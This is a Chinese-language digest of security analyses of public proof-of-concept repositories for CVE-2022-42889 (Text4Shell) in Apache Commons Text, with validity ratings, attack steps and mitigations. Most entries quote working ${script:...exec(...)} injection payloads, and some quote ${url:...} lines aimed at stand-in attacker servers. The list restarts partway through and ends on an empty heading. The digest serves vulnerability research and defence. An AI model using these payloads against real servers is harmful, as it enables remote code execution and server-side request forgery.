**来源**: [CVE-2022-42889-devenes_text4shell-cve-2022-42889.md](../2022/CVE-2022-42889-devenes_text4shell-cve-2022-42889.md)

## CVE-2022-42889-Apache Commons Text-RCE

**漏洞编号:** CVE-2022-42889

**漏洞类型:** 远程代码执行(RCE)

**影响应用:** Apache Commons Text

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** 1.5 <= version <= 1.9

**利用条件:** 应用程序使用了受影响版本的Apache Commons Text，且允许用户可控的输入传递给使用了不安全插值默认值的文本处理函数。

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

该漏洞存在于Apache Commons Text 1.5到1.9版本中，由于默认启用的StringLookup实例存在安全问题，允许攻击者在应用程序处理用户提供的字符串时执行任意代码。

**有效性：**

根据提供的漏洞信息、搜索结果和漏洞利用代码，该漏洞的利用是有效的。漏洞利用代码（Dockerfile、README.md、pom.xml）提供了一个可运行的示例，展示了如何利用该漏洞执行任意命令。

**投毒风险：**

该POC代码的主要目的是演示CVE-2022-42889漏洞的利用。Dockerfile构建了一个包含漏洞的Java应用程序，README.md提供了运行和测试该应用程序的说明，pom.xml则定义了Maven项目的依赖和构建配置。尽管POC代码本身是为了演示漏洞，潜在的投毒风险极低（约1%）。

**利用方式：**

1.  **漏洞原理：** Apache Commons Text 存在变量插值功能，允许动态评估和扩展属性。受影响版本中，默认启用的 `script`、`dns` 和 `url` 等 StringLookup 实例允许执行任意代码、解析 DNS 记录或加载 URL。如果应用程序允许用户控制输入，则可能遭受远程代码执行攻击。
2.  **攻击步骤：**
    a.  部署包含漏洞的应用程序。
    b.  向应用程序发送包含恶意payload的请求。Payload利用 `${prefix:name}` 格式，其中 `prefix` 是 `script`、`dns` 或 `url`，`name` 包含要执行的恶意代码。
    c.  服务器处理请求，执行payload，导致远程代码执行。
3.  **示例payload：**
    `${script:javascript:java.lang.Runtime.getRuntime().exec('touch /tmp/foo')}`

此payload使用 `script` 前缀执行 JavaScript 代码，调用 `java.lang.Runtime.getRuntime().exec()` 执行 `touch /tmp/foo` 命令，在目标服务器上创建 `/tmp/foo` 文件。

**缓解措施：**

*   升级到 Apache Commons Text 1.10.0 或更高版本，该版本默认禁用有问题的插值器。
*   禁用或限制应用程序中使用的不安全 StringLookup 实例。
*   对用户提供的输入进行严格的验证和清理，以防止恶意payload注入。

**项目地址:** [devenes/text4shell-cve-2022-42889](https://github.com/devenes/text4shell-cve-2022-42889)

**漏洞详情:** [CVE-2022-42889](https://nvd.nist.gov/vuln/detail/CVE-2022-42889)

---

## POC #17

**来源**: [CVE-2022-42889-f0ng_text4shellburpscanner.md](../2022/CVE-2022-42889-f0ng_text4shellburpscanner.md)

## CVE-2022-42889-Apache Commons Text-RCE

**漏洞编号:** CVE-2022-42889

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Commons Text

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 1.5 <= version <= 1.9

**利用条件:** 应用程序使用受影响版本的Apache Commons Text，且允许用户控制的输入传递给`StringSubstitutor.replace()`方法。

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2022-42889 (Text4Shell) 漏洞存在于 Apache Commons Text 1.5 到 1.9 版本。该漏洞源于库中不安全的插值默认设置，当应用程序使用这些默认设置且允许用户控制输入时，攻击者可以利用 `${prefix:name}` 格式的字符串，其中 `prefix` 指示要使用的 `StringLookup` 实例。受影响的版本默认包含 `script`、`dns` 和 `url` 这几个 lookup，利用 `script` 可以执行任意 JVM 脚本，利用 `dns` 可以解析 DNS 记录，利用 `url` 可以从远程服务器加载值。攻击者可以构造恶意输入，例如 `${script:javascript:java.lang.Runtime.getRuntime().exec('command')}`，来执行任意命令。提供的漏洞利用代码是一个 Burp Suite 插件，用于检测是否存在此漏洞，它并没有直接执行恶意代码，只是辅助进行漏洞验证。从代码本身来看，没有明显的恶意行为，但考虑到Burp插件的功能强大，理论上作者可以暗中收集用户的使用数据或者篡改请求包，但这种可能性较低，约1%。

**利用方式：**

1.  **确定目标应用程序是否使用了受影响版本的 Apache Commons Text。**
2.  **确定应用程序是否允许用户控制的输入传递给 `StringSubstitutor.replace()` 方法。**
3.  **构造包含恶意插值表达式的输入。** 例如,`${script:javascript:java.lang.Runtime.getRuntime().exec('command')}`。
4.  **将恶意输入发送到目标应用程序。**
5.  **如果应用程序存在漏洞，则恶意命令将在服务器上执行。**

**缓解措施：**

*   升级到 Apache Commons Text 1.10.0 或更高版本，该版本默认禁用有问题的插值器。
*   如果无法升级，则可以禁用应用程序中的 `script`、`dns` 和 `url` 插值器。

**项目地址:** [f0ng/text4shellburpscanner](https://github.com/f0ng/text4shellburpscanner)

**漏洞详情:** [CVE-2022-42889](https://nvd.nist.gov/vuln/detail/CVE-2022-42889)

---

## POC #18

**来源**: [CVE-2022-42889-gokul-ramesh_text4shell-exploit.md](../2022/CVE-2022-42889-gokul-ramesh_text4shell-exploit.md)

## CVE-2022-42889-Apache Commons Text-RCE

**漏洞编号:** CVE-2022-42889

**漏洞类型:** 远程代码执行(RCE)

**影响应用:** Apache Commons Text

**危害等级:** 高危，允许未授权的攻击者执行任意代码

**影响版本:** 1.5 <= version <= 1.9

**利用条件:** 应用程序使用受影响版本的Apache Commons Text, 并且允许变量插值处理不受信任的输入。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-42889，也被称为Text4Shell，是一个存在于Apache Commons Text库中的高危漏洞。该漏洞源于库中不安全的变量插值默认设置。攻击者可以通过构造包含恶意表达式的输入，利用`${prefix:name}`格式进行插值，触发远程代码执行。

**有效性：** 根据漏洞库信息和搜索结果，该漏洞利用是有效的，并且影响Apache Commons Text 1.5到1.9版本。提供的POC代码尝试利用`script`, `url` 和 `dns` 等 lookup 实现远程代码执行。

**投毒风险：**
*   POC代码本身的主要目的是为了验证漏洞的存在，利用interactsh来验证命令执行。投毒风险评估较低，约为10%。
*   投毒风险主要来自以下方面：虽然POC主要目的是进行漏洞验证，但如果使用者不小心，直接在生产环境运行，可能会造成破坏。此外，攻击者可能修改POC代码，添加恶意功能，例如植入后门，并传播修改后的POC。
*   代码中使用了 `ping` 命令进行验证，这本身没有危害，但恶意修改者可能替换成更危险的命令。

**利用方式：**
1.  **漏洞定位：** 确定目标应用程序使用了Apache Commons Text 1.5到1.9的受影响版本。
2.  **构造Payload：** 构造包含恶意表达式的输入字符串，利用`${script:javascript:java.lang.Runtime.getRuntime().exec('command')}`, `${url:UTF-8:java.lang.Runtime.getRuntime().exec('command')}` 或者 `${dns:address:java.lang.Runtime.getRuntime().exec('command')}` 这样的格式。
3.  **发送Payload：** 将构造的Payload作为输入发送到目标应用程序，例如通过HTTP请求的查询参数或User-Agent头。
4.  **执行代码：** 如果应用程序使用Commons Text对Payload进行变量插值，恶意代码将被执行。
5.  **验证：** 使用interactsh等工具验证代码是否成功执行。例如, 通过DNS请求或者ping命令。

**缓解措施：**
*   升级到Apache Commons Text 1.10.0或更高版本，该版本默认禁用了有问题的插值器。
*   如果无法升级，可以配置`StringLookupFactory`以禁用`script`、`dns`和`url`查找。
*   对所有用户输入进行严格的验证和清理，避免将不受信任的数据传递给Commons Text进行处理。

**项目地址:** [gokul-ramesh/text4shell-exploit](https://github.com/gokul-ramesh/text4shell-exploit)

**漏洞详情:** [CVE-2022-42889](https://nvd.nist.gov/vuln/detail/CVE-2022-42889)

---

## POC #19

**来源**: [CVE-2022-42889-hotblac_text4shell.md](../2022/CVE-2022-42889-hotblac_text4shell.md)

## CVE-2022-42889 - Apache Commons Text RCE (Text4Shell)

**漏洞编号:** CVE-2022-42889

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Commons Text

**危害等级:** 高危，允许未经身份验证的攻击者执行任意代码

**影响版本:** <= 1.9

**利用条件:** 应用程序必须使用受影响版本的Apache Commons Text，并且允许用户控制的输入传递给StringSubstitutor进行插值。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2022-42889 (Text4Shell) 是 Apache Commons Text 库中的一个漏洞，允许攻击者通过操纵传递给 `StringSubstitutor` 的输入来执行任意代码。漏洞存在于1.5到1.9版本中。升级到1.10.0及以上版本可以解决此问题，因为该版本默认禁用了有问题的插值器，或者禁用受影响的lookup，例如`script`, `dns`, `url`。

**有效性：**
根据漏洞描述和搜索结果，提供的POC代码（尤其是 `src/main/java/org/dontpanic/text4shell/controller/ExploitMeController.java` 文件）旨在演示此漏洞。`ExploitMeController` 中的 `/lookup` 端点接收用户提供的 `value`，并将其直接传递给 `StringSubstitutor.replace()` 方法，而没有进行任何清理或验证。这允许攻击者注入恶意表达式，例如`${script:javascript:Runtime.getRuntime().exec("command")}`，从而导致远程代码执行。

**投毒风险：**
提供的代码主要是漏洞利用的演示，旨在重现和展示 CVE-2022-42889。虽然代码本身并没有明显的恶意或后门性质，但存在一些小的风险。由于整个仓库的目的就是为了演示漏洞，如果有人下载并部署了这个应用，并将其暴露在公网上，那么它会立即成为攻击目标。因此，可以认为存在很低的投毒风险 (约5%)，因为作者可能故意提供一个容易被利用的环境，但不是传统意义上的“投毒”，而是漏洞演示的副产品。

**利用方式：**
1.  **目标系统：** 目标系统需要运行使用了 Apache Commons Text 1.5 到 1.9 版本的应用程序。
2.  **输入注入：** 攻击者需要找到一个应用程序接口，该接口允许用户提供输入，然后应用程序使用受影响的 Apache Commons Text 版本对该输入进行插值处理。例如，在提供的 POC 中，`/lookup` 端点就是一个这样的接口。
3.  **构造恶意Payload：**  攻击者需要构造一个包含恶意表达式的Payload，该表达式利用了 `script`, `dns`, 或 `url` lookup 来执行代码或进行其他恶意操作。示例Payload：
    *   `${script:javascript:Runtime.getRuntime().exec('touch /tmp/pwned')}` - 执行任意命令 (例如，创建一个文件)。
    *   `${dns:address|example.com}` - 执行 DNS 查询。
    *   `${url:UTF-8:https://example.com/evil.txt}` - 从远程 URL 加载内容。
4.  **发送Payload：**  攻击者将构造的Payload发送到目标应用程序的易受攻击的接口。
5.  **代码执行：**  如果应用程序使用 `StringSubstitutor` 处理Payload，它将执行Payload中的恶意表达式，从而导致远程代码执行或其它恶意行为。


**项目地址:** [hotblac/text4shell](https://github.com/hotblac/text4shell)

**漏洞详情:** [CVE-2022-42889](https://nvd.nist.gov/vuln/detail/CVE-2022-42889)

---

## POC #20

**来源**: [CVE-2022-42889-joshbnewton31080_cve-2022-42889-text4shell.md](../2022/CVE-2022-42889-joshbnewton31080_cve-2022-42889-text4shell.md)

## CVE-2022-42889-Apache Commons Text-RCE

**漏洞编号:** CVE-2022-42889

**漏洞类型:** 远程代码执行

**影响应用:** Apache Commons Text

**危害等级:** 高危，允许远程代码执行

**影响版本:** 1.5 <= version <= 1.9

**利用条件:** 应用程序使用受影响的Apache Commons Text版本，并且允许用户控制的输入传递给StringSubstitutor.replace()方法

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2022-42889，也被称为Text4Shell，是Apache Commons Text库中的一个远程代码执行漏洞。该漏洞源于库中使用的字符串插值功能，攻击者可以通过构造包含恶意脚本的输入，例如`${script:javascript:java.lang.Runtime.getRuntime().exec('touch /tmp/foo')}`，来执行任意代码。提供的POC代码通过创建一个简单的Spring Boot应用程序，演示了如何利用该漏洞。`HelloController.java`文件中的`attack`方法使用`StringSubstitutor.createInterpolator()`创建插值器，并使用`interpolator.replace(search)`来替换用户提供的输入。如果应用程序使用Commons Text 1.5到1.9版本，并且允许用户控制的输入传递给`replace()`方法，则攻击者可以利用此漏洞执行任意代码。

**有效性：**

根据提供的漏洞库信息、搜索引擎结果和POC代码，可以判断该漏洞利用是有效的。POC代码展示了利用`script`前缀执行`touch`命令的例子。搜索引擎结果也确认了该漏洞的存在以及利用方式。

**投毒风险：**

审查提供的文件，Dockerfile文件用于构建Docker镜像，pom.xml是Maven的配置文件，用于管理项目依赖和构建过程，src/main/java包含了应用程序的源代码，src/test/java 包含了测试代码。这些文件本身不包含明显的恶意代码，因此可以判断投毒风险较低。pom.xml 中指定的 commons-text 版本是1.8， 属于漏洞版本。 Dockerfile文件也没问题。

**利用方式：**

1.  应用程序使用Apache Commons Text 1.5到1.9版本。
2.  应用程序允许用户控制的输入传递给`StringSubstitutor.replace()`方法。
3.  攻击者构造包含恶意脚本的输入，例如`${script:javascript:java.lang.Runtime.getRuntime().exec('command')}`，其中`command`是要执行的任意命令。
4.  应用程序使用`StringSubstitutor.replace()`方法替换输入，触发漏洞，执行恶意代码。

**项目地址:** [joshbnewton31080/cve-2022-42889-text4shell](https://github.com/joshbnewton31080/cve-2022-42889-text4shell)

**漏洞详情:** [CVE-2022-42889](https://nvd.nist.gov/vuln/detail/CVE-2022-42889)

---

## POC #21

**来源**: [CVE-2022-42889-karthikuj_cve-2022-42889-text4shell-docker.md](../2022/CVE-2022-42889-karthikuj_cve-2022-42889-text4shell-docker.md)

# CVE-2022-42889

> 📦 该CVE有 **28** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2022-42889-34006133_CVE-2022-42889.md](../2022/CVE-2022-42889-34006133_CVE-2022-42889.md)

## CVE-2022-42889 Text4Shell RCE

**漏洞编号:** CVE-2022-42889

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Commons Text

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 1.5 <= version <= 1.9

**利用条件:** 应用程序使用受影响版本的 Apache Commons Text，并且允许用户可控的输入传递给执行插值的函数。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2022-42889 (Text4Shell) 是一个 Apache Commons Text 库中的远程代码执行漏洞。该漏洞源于库中存在变量插值功能，允许动态评估和扩展属性。在 1.5 到 1.9 版本中，默认的 Lookup 实例包含一些插值器，例如 "script", "dns", 和 "url"，这些插值器可能导致任意代码执行或与远程服务器通信。如果应用程序使用这些默认插值器并且允许用户可控的输入进行插值，那么攻击者可以通过构造包含恶意表达式的输入，例如`${script:javascript:java.lang.Runtime.getRuntime().exec('command')}`，来执行任意代码。提供的漏洞利用代码 `main.go` 尝试构造一个包含恶意payload的URL，该URL包含一个 `${script:javascript:java.lang.Runtime.getRuntime().exec('command')}` 形式的payload, 并通过HTTP GET请求发送到目标服务器。`possiblepoc.go` 文件似乎尝试创建一个反向shell。 根据代码分析,未发现作者隐藏的恶意投毒代码。利用方式：1. 确定目标应用程序正在使用受影响版本的 Apache Commons Text 并且暴露了允许用户输入进行插值的接口。2. 构造包含恶意表达式的输入，例如`${script:javascript:java.lang.Runtime.getRuntime().exec('command')}`。3. 将构造的输入发送到目标应用程序，触发漏洞并执行任意代码。

**项目地址:** [34006133/CVE-2022-42889](https://github.com/34006133/CVE-2022-42889)

**漏洞详情:** [CVE-2022-42889](https://nvd.nist.gov/vuln/detail/CVE-2022-42889)

---

## POC #2

**来源**: [CVE-2022-42889-808ale_CVE-2022-42889-Text4Shell-POC.md](../2022/CVE-2022-42889-808ale_CVE-2022-42889-Text4Shell-POC.md)

## CVE-2022-42889-Apache Commons Text-RCE/SSRF

**漏洞编号:** CVE-2022-42889

**漏洞类型:** 远程代码执行 (RCE) / 服务器端请求伪造 (SSRF)

**影响应用:** Apache Commons Text

**危害等级:** 高危，可能导致远程代码执行或服务器端请求伪造

**影响版本:** < 1.10.0 (1.5 <= version <= 1.9)

**利用条件:** 应用程序使用受影响的Apache Commons Text版本，并且允许用户可控输入被用于文本插值。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2022-42889，也被称为Text4Shell，是Apache Commons Text 1.5到1.9版本中的一个严重漏洞。该漏洞允许攻击者通过构造包含恶意表达式的字符串，利用文本插值功能执行任意代码（RCE）或发起服务器端请求伪造（SSRF）攻击。

**有效性分析：**

提供的POC代码是一个Python脚本，旨在测试目标系统是否存在Text4Shell漏洞。该脚本支持两种模式：

*   **RCE模式：** 利用`script`前缀，尝试执行JavaScript命令。具体而言，它使用Nashorn引擎（在Java 15及更高版本中默认禁用）来执行操作系统命令。如果目标系统启用了Nashorn引擎，则可能成功执行RCE攻击。
*   **SSRF模式：** 利用`url`前缀，尝试从指定的URL获取内容。这可能导致服务器向攻击者控制的服务器发出请求，从而泄露敏感信息或进行其他攻击。

根据NVD信息和搜索引擎结果，该漏洞影响Apache Commons Text 1.5到1.9版本，利用的关键在于应用程序是否接受用户可控的输入并将其传递给`StringSubstitutor.replace()`等插值方法。

因此，该POC代码在特定条件下是有效的。如果目标系统使用了受影响的Apache Commons Text版本，并且允许用户输入参与文本插值，那么攻击者就可以利用该漏洞。

**投毒风险分析：**

对提供的POC代码进行分析，可以发现其中存在轻微的投毒风险。虽然脚本本身的功能是测试漏洞，但如果攻击者修改脚本，例如：

*   **修改RCE命令：** 将测试命令替换为恶意命令，例如下载并执行恶意程序。
*   **修改SSRF URL：** 将SSRF目标URL替换为指向包含恶意内容的URL，例如包含恶意JavaScript代码的页面。
*   **增加额外功能** 添加未经授权的信息收集功能。

这些修改可能会导致用户在不知情的情况下受到攻击。

因此，评估的投毒风险为5%。主要集中在使用人员的安全意识上，是否存在下载后未进行代码审核直接执行的情况。

**利用方式：**

1.  **确定目标系统使用的Apache Commons Text版本是否在受影响范围内 (1.5-1.9)。**
2.  **找到应用程序中接受用户输入并使用Apache Commons Text进行文本插值的位置。**
3.  **构造包含恶意表达式的字符串，例如：**
    *   `${script:javascript:java.lang.Runtime.getRuntime().exec('malicious_command')}` (RCE，需要Nashorn引擎支持)
    *   `${url:UTF-8:http://attacker_controlled_server/resource}` (SSRF)
4.  **将构造的恶意字符串作为用户输入传递给应用程序。**
5.  **如果漏洞利用成功，攻击者将能够执行任意代码或发起SSRF攻击。**

**项目地址:** [808ale/CVE-2022-42889-Text4Shell-POC](https://github.com/808ale/CVE-2022-42889-Text4Shell-POC)

**漏洞详情:** [CVE-2022-42889](https://nvd.nist.gov/vuln/detail/CVE-2022-42889)

---

## POC #3

**来源**: [CVE-2022-42889-Dima2021_cve-2022-42889-text4shell.md](../2022/CVE-2022-42889-Dima2021_cve-2022-42889-text4shell.md)

## CVE-2022-42889-Apache Commons Text-RCE

**漏洞编号:** CVE-2022-42889

**漏洞类型:** 远程代码执行（RCE）

**影响应用:** Apache Commons Text

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** 1.5 <= version <= 1.9

**利用条件:** 应用程序使用了受影响版本的 Apache Commons Text，并且允许用户控制输入，该输入会被用于字符串插值。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2022-42889，也被称为Text4Shell，是一个影响Apache Commons Text库的远程代码执行漏洞。该漏洞源于Apache Commons Text在1.5到1.9版本中，默认启用了一些不安全的StringLookup实现，如`script`，`dns`和`url`。当应用程序使用这些默认的Lookup实例并且允许用户控制输入时，攻击者可以通过构造恶意的字符串，利用变量插值功能执行任意代码。

**有效性分析：**

提供的POC代码是一个Spring Boot应用程序，它使用Apache Commons Text库进行字符串插值。`HelloController.java`文件中的`attack`方法接收一个名为`search`的请求参数，并使用`StringSubstitutor.createInterpolator()`创建一个插值器，然后使用`interpolator.replace(search)`方法对`search`参数进行插值。这意味着攻击者可以通过`search`参数传递恶意的字符串，例如`${script:javascript:java.lang.Runtime.getRuntime().exec('touch /tmp/foo')}`，来执行任意代码。`pom.xml`文件显示该项目使用了Apache Commons Text 1.8版本，属于受影响的版本范围。`README.md`文件提供了构建、运行和测试该POC应用程序的步骤，并提供了一个示例攻击payload。

根据漏洞信息和POC代码分析，该POC代码是有效的，可以用于演示和验证CVE-2022-42889漏洞。

**投毒风险分析：**

分析提供的代码，没有发现明显的投毒代码。该仓库的主要目的是为了演示CVE-2022-42889漏洞，代码结构清晰，功能单一，主要就是接收输入并利用commons-text进行解析。

**利用方式：**

1.  攻击者首先需要找到一个应用程序，该应用程序使用了受影响版本的Apache Commons Text库（1.5到1.9）。
2.  攻击者需要找到一个允许用户控制输入的地方，该输入会被传递给`StringSubstitutor.replace()`方法进行插值。
3.  攻击者构造一个包含恶意payload的字符串，例如`${script:javascript:java.lang.Runtime.getRuntime().exec('command')}`，其中`command`是要执行的任意命令。
4.  攻击者将构造的恶意字符串作为输入传递给应用程序。
5.  应用程序使用`StringSubstitutor.replace()`方法对输入进行插值，从而执行攻击者指定的命令。

利用`dns`，攻击者可以构造payload让服务器解析恶意域名，从而进行信息收集或发起其他攻击。利用`url`，攻击者可以让服务器请求恶意URL，从而可能导致SSRF（服务器端请求伪造）漏洞。

**修复建议：**

升级到Apache Commons Text 1.10.0或更高版本。新版本默认禁用了`script`，`dns`和`url`等不安全的StringLookup实现。如果必须使用这些Lookup，请确保只在可信的环境中使用。

**项目地址:** [Dima2021/cve-2022-42889-text4shell](https://github.com/Dima2021/cve-2022-42889-text4shell)

**漏洞详情:** [CVE-2022-42889](https://nvd.nist.gov/vuln/detail/CVE-2022-42889)

---

## POC #4

**来源**: [CVE-2022-42889-DimaMend_cve-2022-42889-text4shell.md](../2022/CVE-2022-42889-DimaMend_cve-2022-42889-text4shell.md)

## CVE-2022-42889-Apache Commons Text-RCE

**漏洞编号:** CVE-2022-42889

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Commons Text

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** <= 1.9

**利用条件:** 应用使用了受影响版本的Apache Commons Text，并且允许用户可控的字符串参与到`${}`表达式的解析过程中

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2022-42889，也被称为 Text4Shell，是 Apache Commons Text 1.5 到 1.9 版本中的一个远程代码执行漏洞。该漏洞源于库中使用的字符串插值功能。当应用程序使用这些版本的 Commons Text，并且将用户提供的、未经充分清理的数据传递给 StringSubstitutor.replace() 方法时，攻击者可以利用`${prefix:name}`格式的字符串注入恶意代码。

**有效性：**

提供的PoC 代码有效，它演示了如何利用该漏洞执行任意命令。PoC 代码包含了一个 Spring Boot 应用程序，该程序接受一个名为 `search` 的请求参数，并使用 `StringSubstitutor.replace()` 方法对其进行插值。通过构造包含`${script:javascript:java.lang.Runtime.getRuntime().exec('command')}` 的恶意 payload，攻击者可以在服务器上执行任意命令。

**投毒风险：**

该仓库中作者隐藏的投毒代码可能性极低。`Dockerfile`、`pom.xml`和java源代码没有发现任何恶意行为。虽然存在远程代码执行漏洞，但这本身不是投毒。1%的风险在于构建脚本可能依赖于外部资源（例如，Maven仓库），这些资源可能在构建时被篡改，或者受到供应链攻击。但是，就提供的代码本身而言，它似乎没有包含故意的恶意代码。

**利用方式：**

1.  攻击者需要找到一个应用程序，该程序使用了存在漏洞的 Apache Commons Text 版本（<= 1.9）。
2.  攻击者需要在该应用程序中找到一个输入点（例如，HTTP 请求参数、表单字段等），该输入点允许攻击者控制将传递给 `StringSubstitutor.replace()` 方法的字符串。
3.  攻击者构造包含恶意`${prefix:name}` 表达式的 payload。`prefix` 可以是 `script`、`dns` 或 `url`。例如，可以使用 `${script:javascript:java.lang.Runtime.getRuntime().exec('command')}` 执行任意命令，使用 `${dns:address}` 解析恶意域名，或使用 `${url:UTF-8:url}` 从远程服务器加载数据。
4.  攻击者将 payload 传递给应用程序。
5.  应用程序使用 `StringSubstitutor.replace()` 方法处理 payload，导致恶意代码被执行。

**项目地址:** [DimaMend/cve-2022-42889-text4shell](https://github.com/DimaMend/cve-2022-42889-text4shell)

**漏洞详情:** [CVE-2022-42889](https://nvd.nist.gov/vuln/detail/CVE-2022-42889)

---

## POC #5

**来源**: [CVE-2022-42889-Gotcha1G_CVE-2022-42889.md](../2022/CVE-2022-42889-Gotcha1G_CVE-2022-42889.md)

## CVE-2022-42889-Apache Commons Text-RCE

**漏洞编号:** CVE-2022-42889

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Commons Text

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** <= 1.9

**利用条件:** 应用程序使用受影响版本的Apache Commons Text，且允许用户可控的输入传递给文本插值功能

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-42889，又名Text4Shell，是Apache Commons Text库中的一个远程代码执行漏洞。该漏洞源于库中不安全的默认文本插值配置，允许攻击者通过构造包含恶意表达式的输入，利用`script`, `dns`, 或 `url` 等lookup执行任意代码或与远程服务器通信。

**有效性：**
根据漏洞库信息、搜索引擎结果以及提供的PoC代码，此漏洞的利用是有效的。搜索引擎结果中的多个条目都将此漏洞描述为高危远程代码执行漏洞，并提供了利用示例。

**投毒风险：**
提供的PoC代码本身旨在验证漏洞的存在，通过`curl+{{interactsh-url}}`的方式来检测是否成功执行了命令。由于该PoC代码目的在于触发漏洞并进行验证，不包含恶意行为（例如：上传恶意文件、修改系统配置等），因此其主要风险在于被滥用进行攻击。但仓库中其他未提供的文件，可能存在隐藏的后门或恶意代码，因此综合判定存在10%的投毒风险。

**利用方式：**
攻击者将构造包含恶意表达式的字符串，例如`${script:javascript:java.lang.Runtime.getRuntime().exec('command')}`。这个字符串会被传递给使用了Apache Commons Text库进行文本插值的应用程序。如果应用程序没有对用户输入进行充分的验证和过滤，该表达式将被解析并执行，导致远程代码执行。PoC中使用了`curl`命令和`interactsh`服务来验证漏洞是否成功利用，实际攻击中可以替换成任何其他命令。

简而言之，利用方式是：
1.  应用程序使用存在漏洞的Apache Commons Text版本（<= 1.9）。
2.  应用程序允许用户可控的输入传递给文本插值功能。
3.  攻击者构造包含恶意表达式的输入。
4.  Apache Commons Text解析并执行恶意表达式，导致RCE。

**项目地址:** [Gotcha1G/CVE-2022-42889](https://github.com/Gotcha1G/CVE-2022-42889)

**漏洞详情:** [CVE-2022-42889](https://nvd.nist.gov/vuln/detail/CVE-2022-42889)

---

## POC #6

**来源**: [CVE-2022-42889-MendDemo-josh_cve-2022-42889-text4shell.md](../2022/CVE-2022-42889-MendDemo-josh_cve-2022-42889-text4shell.md)

## CVE-2022-42889 Text4Shell

**漏洞编号:** CVE-2022-42889

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Commons Text

**危害等级:** 高危，允许未经身份验证的攻击者执行任意代码

**影响版本:** 1.5 <= version <= 1.9

**利用条件:** 应用程序使用了受影响版本的Apache Commons Text，并且允许用户可控的字符串传递给`StringSubstitutor.replace()`方法。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-42889，又名Text4Shell，是Apache Commons Text库中的一个漏洞。该漏洞源于库中使用的字符串插值功能，攻击者可以通过构造包含恶意表达式的字符串，利用`script`, `dns` 或 `url` 等前缀，触发远程代码执行。该漏洞利用的有效性较高，因为提供的POC代码直接演示了如何使用`script`前缀执行`touch /tmp/foo`命令。Docker文件和README文件提供了构建和运行包含漏洞的应用程序的详细说明。尽管POC展示了RCE，但是仍然需要确认是否存在投毒风险，通过阅读所有提供的文件，没有发现任何隐藏的后门代码或其他恶意行为。Dockerfile文件用于构建包含漏洞应用程序的Docker镜像，pom.xml指定了所使用的commons-text版本为1.8，处于漏洞影响范围内。java代码也用于漏洞的验证。`HelloController.java` 暴露了一个 `/text4shell/attack` 的API接口，接收一个名为 `search` 的参数，并使用 `StringSubstitutor.replace()` 方法对其进行处理，从而导致漏洞。风险主要在于，这个demo程序是否会被滥用，作者是否会把这个程序用于攻击等等。 经过评估,作者投毒的可能性较小，但是仍然有一定的潜在风险，大约为10%。

**利用方式：**
1.  攻击者将特制的字符串（包含`${prefix:payload}`格式的恶意表达式）作为输入，传递给使用了`StringSubstitutor.replace()`方法的应用程序。
2.  `StringSubstitutor`会对字符串进行插值，如果`prefix`是`script`，`dns`或者`url`，则会调用相应的lookup来解析`payload`。
3.  `script`前缀允许执行任意的Java代码，`dns`前缀允许进行DNS查询，`url`前缀允许从URL加载内容，恶意构造的`payload`可以导致RCE或SSRF攻击。

**项目地址:** [MendDemo-josh/cve-2022-42889-text4shell](https://github.com/MendDemo-josh/cve-2022-42889-text4shell)

**漏洞详情:** [CVE-2022-42889](https://nvd.nist.gov/vuln/detail/CVE-2022-42889)

---

## POC #7

**来源**: [CVE-2022-42889-QAInsights_cve-2022-42889-jmeter.md](../2022/CVE-2022-42889-QAInsights_cve-2022-42889-jmeter.md)

## CVE-2022-42889: Apache Commons Text RCE

**漏洞编号:** CVE-2022-42889

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Commons Text

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 1.5 <= version <= 1.9

**利用条件:** 应用程序使用受影响版本的 Apache Commons Text，并且允许用户可控的字符串进行变量插值。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2022-42889 漏洞是 Apache Commons Text 库中一个远程代码执行漏洞，存在于 1.5 到 1.9 版本中。该漏洞源于库中存在不安全的默认变量插值配置，允许攻击者通过 `${prefix:name}` 格式的字符串执行任意代码或与远程服务器交互。其中，`prefix` 用于定位执行插值的 `org.apache.commons.text.lookup.StringLookup` 实例。存在风险的 `prefix` 包括 `script` (执行 JVM 脚本), `dns` (解析 DNS 记录), 和 `url` (从 URL 加载值)。

**有效性：**
根据漏洞描述、搜索结果和漏洞利用方式，该漏洞利用是有效的。搜索结果中多个链接表明该漏洞（又名 Text4Shell）是一个严重的安全问题，允许远程代码执行。

**投毒风险：**
提供的代码片段是 Apache License 的许可证文本，不包含任何可执行代码，因此不存在投毒风险。投毒风险评估为 0%。

**利用方式：**
1.  应用程序使用 Apache Commons Text 1.5 到 1.9 版本。
2.  应用程序接受用户提供的字符串，并使用该字符串进行变量插值，没有进行充分的过滤或安全处理。
3.  攻击者构造包含恶意 `prefix` 的字符串，例如 `${script:javascript code}` 或 `${url:http://malicious-server/evil.txt}`。
4.  Apache Commons Text 解析该字符串，并执行相应的操作，例如执行 JavaScript 代码或从恶意 URL 加载内容，从而导致远程代码执行或信息泄露。

**项目地址:** [QAInsights/cve-2022-42889-jmeter](https://github.com/QAInsights/cve-2022-42889-jmeter)

**漏洞详情:** [CVE-2022-42889](https://nvd.nist.gov/vuln/detail/CVE-2022-42889)

---

## POC #8

